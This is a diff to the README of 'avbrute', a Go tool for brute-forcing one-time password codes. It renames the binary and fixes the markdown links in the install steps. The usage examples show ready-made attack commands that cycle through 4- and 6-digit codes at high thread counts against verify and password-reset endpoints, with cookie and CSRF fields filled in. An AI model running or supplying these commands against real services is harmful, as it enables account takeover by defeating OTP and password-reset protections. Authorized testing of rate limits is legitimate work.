@@ -5,16 +5,16 @@ A high-speed, asynchronous OTP (One-Time Password) brute-force tool written in G
 ## Installation
 
 ```bash
-git clone [https://github.com/devazizov/avbrute.git](https://github.com/devazizov/avbrute.git)
-cd otp-brute
-go build -o otp-brute main.go
+git clone https://github.com/devazizov/avbrute.git
+cd avbrute
+go build -o avbrute main.go
 
 ```
 
 ## Usage
 
 ```bash
-./otp-brute -u <URL> -d <DATA> [PARAMETERS]
+./avbrute -u <URL> -d <DATA> [PARAMETERS]
 
 ```
 
@@ -33,21 +33,21 @@ go build -o otp-brute main.go
 **1. 4-digit code (JSON format):**
 
 ```bash
-./otp-brute -u [http://127.0.0.1/api/verify](http://127.0.0.1/api/verify) -d '{"phone":"998901234567","code":"OTP"}' -r 4
+./avbrute -u [http://127.0.0.1/api/verify](http://127.0.0.1/api/verify) -d '{"phone":"998901234567","code":"OTP"}' -r 4
 
 ```
 
 **2. 6-digit code, text match, and high threads:**
 
 ```bash
-./otp-brute -u [http://127.0.0.1/api/verify](http://127.0.0.1/api/verify) -d '{"phone":"998901234567","code":"OTP"}' -r 6 -m "true" -t 500
+./avbrute -u [http://127.0.0.1/api/verify](http://127.0.0.1/api/verify) -d '{"phone":"998901234567","code":"OTP"}' -r 6 -m "true" -t 500
 
 ```
 
 **3. Form-Data, specific range, and Cookie (expecting 302 Redirect):**
 
 ```bash
-./otp-brute -u [https://target.com/reset](https://target.com/reset) -d "csrf=token&code=OTP" -r 56000-56900 -s 302 -c "session=xyz123"
+./avbrute -u [https://target.com/reset](https://target.com/reset) -d "csrf=token&code=OTP" -r 56000-56900 -s 302 -c "session=xyz123"
 
 ```
 
